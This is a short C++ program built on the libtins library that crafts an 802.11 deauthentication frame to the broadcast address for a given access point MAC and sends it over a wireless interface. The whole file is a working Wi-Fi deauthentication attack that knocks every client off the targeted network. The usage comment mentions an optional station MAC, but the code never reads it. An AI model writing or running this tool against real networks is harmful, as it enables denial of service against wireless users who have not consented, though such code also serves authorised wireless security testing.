#include <iostream>
#include <tins/tins.h>

using namespace std;
using namespace Tins;

int main(int argc, char *argv[])
{
    string if_name;
    Dot11::address_type ap_addr;
    /*
     *  send_deauth <interce name> <ap mac> [<station mac>]
     */

    if(argc < 3){
        /* default option setting */
        if_name = "net0";
        ap_addr = "00:07:89:32:0A:9F";

        cout << "send_deauth <interce name> <ap mac> [<station mac>]" << endl;
        //return 0;
    }else{
        if_name = argv[1];
        ap_addr = HWAddress<6>(argv[2]);
    }

    /* make deauth packet*/
    Dot11Deauthentication deauth(Dot11::BROADCAST, ap_addr);
    deauth.addr3(ap_addr);

    RadioTap tap = RadioTap() / deauth;

    PacketSender sender;
    NetworkInterface iface(if_name);
    sender.send(tap, iface);

    return 0;
}
